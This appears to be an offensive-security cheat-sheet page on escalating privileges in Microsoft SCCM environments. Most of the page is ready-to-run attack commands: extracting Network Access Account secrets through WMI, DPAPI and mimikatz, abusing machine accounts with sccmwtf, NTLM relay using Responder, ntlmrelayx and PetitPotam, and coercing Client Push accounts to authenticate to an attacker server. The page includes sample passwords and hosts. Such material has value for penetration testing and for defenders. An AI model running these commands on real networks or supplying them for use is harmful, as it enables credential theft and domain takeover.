# Privilege Escalation

Currently there are two different path ways for privilege escalation routes in an SCCM environment:

* Credential harvesting
* Authentication Coercion

## Credential Harvesting

{% embed url="https://www.thehacker.recipes/ad/movement/sccm-mecm#credential-harvesting" %}

### SCCM Credentials

The following SCCM components can contain credentials:

* Device Collection variables
* TaskSequence variables
* Network Access Accounts (NAAs)
* Client Push Accounts
* Application & Scripts (potentially)

### Misconfigured NAA

* SCCM, uses various accounts in a deployment. One of the accounts it uses is called the “Network Access Account” or NAA. The NAA serves a simple role in SCCM: allow a non-domain-joined computer to retrieve software from the SCCM distribution point.
* The NAA does nothing on the host. It simply accesses resources over the network. Therefore, the account should be configured with the least privilege necessary to access the content on the distribution point. It should also be configured such that it does not have interactive logon rights. **Can be misconfigured.**

#### Retrieving the credentials

> The SCCM server sends the NAA policy which includes the credentials for the account to every SCCM client. the NAA policy gets stored on the client and protected by DPAPI. Specifically, the credentials are protected by the system’s DPAPI master key then stored as blobs in the “CCM\_NetworkAccessAccount” class of the “root\ccm\policy\Machine\ActualConfig” WMI namespace. We can manually query these blobs from a high-integriy PowerShell process:

```powershell
# Locally
## Locally From WMI
PS:> Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
## Extracting from CIM store
PS:> .\SharpSCCM.exe local secretes disk
## Extracting from WMI
PS:> .\SharpSCCM.exe local secretes wmi
## Using SharpDPAPI
PS:> .\SharpDPAPI.exe SCCM
## Using mimikatz
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # dpapi::sccm

# Remotely from policy
PS:> .\SharpSCCM.exe get secretes
```

***

**Decypher the WMI blob via DPAPI**

```bash
python3 SystemDPAPIdump.py -creds -sccm 'DOMAIN/USER:Password'@'target.domain.local'
```

* NAA sole purpose is to authenticate to the SCCM server if the machine is not domain join yet. (Normally SCCM client use its machine account)
* Although widely use, NAA are not required, Enhanced HTTP is safer option

#### Secret from endpoint - Exploit

Prerequisite :

* Local admin on a SCCM client

```powershell
# Windows
SharpSCCM_merged.exe get secrets
SharpSCCM_merged.exe local secrets -m wmi # (NAA, Task Sequences, Collection Variables )
# or
SharpDPAPI.exe SCCM

# Linux - Dump DPAPI with impakcets
python3 SystemDPAPIdump.py root.local/workstationadmin:'Alphatango999!'@win10-7.root.local
```

#### NAA via SCCMwtf Technique

Prerequisite :

* Not local admin
* Needs machine account

```bash
# with low privilege user
addcomputer.py 'root.local/low:Alphatango999!' -dc-ip 192.168.1.7

python3 sccmwtf.py DESKTOP-CHV00CWW DESKTOP-CHV00CWW.ROOT.LOCAL sccm2 'ROOT.LOCAL\DESKTOPCHV00CWW$' 'EwlWUXEIN5Bn8ja5sOSqGYeFkl87d4OB'

# the NAA policy is encrypted
cat /tmp/naapolicy.xml

# decrypt it with sccm-decryp.exe
# do it for user and password values !
sccm-decrypt.exe 891300007ADC03BD2E0(...)
```

#### Extraction via Relay

Prerequisites :

* No domain credentials? (only for variant 1: Poisoning )
* Not local admin?
* No fake machine account? ms-DS-MachineAccountQuota = 0
* Only SMB machine account **NetNTLMv2** hash is required (PetitPotam, Printer bug)

```bash
# Variant 1: Poisoning (No creds, work only if poisoning a machine account)
nano Responder.conf # (turn off smb and http)
Responder -I eth0
ntlmrelayx.py -t http://sccm2.root.local/ccm_system_windowsauth/request --sccm --sccm-device test1 --sccm-fqdn sccm2.root.local --sccm-server sccm2 --sccm-sleep 10 -smb2support

# Variant 2: Coercion PetitPotam (Required low priv creds)
ntlmrelayx.py -t http://sccm2.root.local/ccm_system_windowsauth/request --sccm --sccm-device test1 --sccm-fqdn sccm2.root.local --sccm-server sccm2 --sccm-sleep 10 -smb2support

python3 PetitPotam.py 192.168.1.101 win10-7.root.local -u low -p 'Alphatango999!' -d root.local
cat naapolicy.xml

# From any Windows box
# do it for user and password values!
sccm-decrypt.exe 891300007ADC03BD2E0(...)
```

## Authentication Coercion

### Via client push installation

> With a compromised machine in an Active Directory where SCCM is deployed via Client Push Accounts on the assets, it is possible to have the "Client Push Account" authenticate to a remote resource and, for instance, retrieve an NTLM response (i.e. NTLM Capture). The "Client Push Account" usually has local administrator rights to a lot of assets. **In some case, the "Client Push Accounts" could even be part of the Domain Admins group, leading to a complete takeover of the domain.**

### Option 1 : Wait for Client Push Installation

```powershell
## Credential capture using Inveigh 
PS:> .\Inveigh.exe
```

### Option 2 : Prepare Coercion Receiver

```powershell
# On Linux
## Relay using ntlmrelayx.py
python3 examples/ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179

# On Windows
## Credential capture using Inveigh 
.\Inveigh.exe

### Trigger Client-Push Installation
## If admin access over Management Point (MP)
.\SharpSCCM.exe invoke client-push -t <AttackerServer> --as-admin
## If not MP admin
.\SharpSCCM.exe invoke client-push -t <AttackerServer>
```
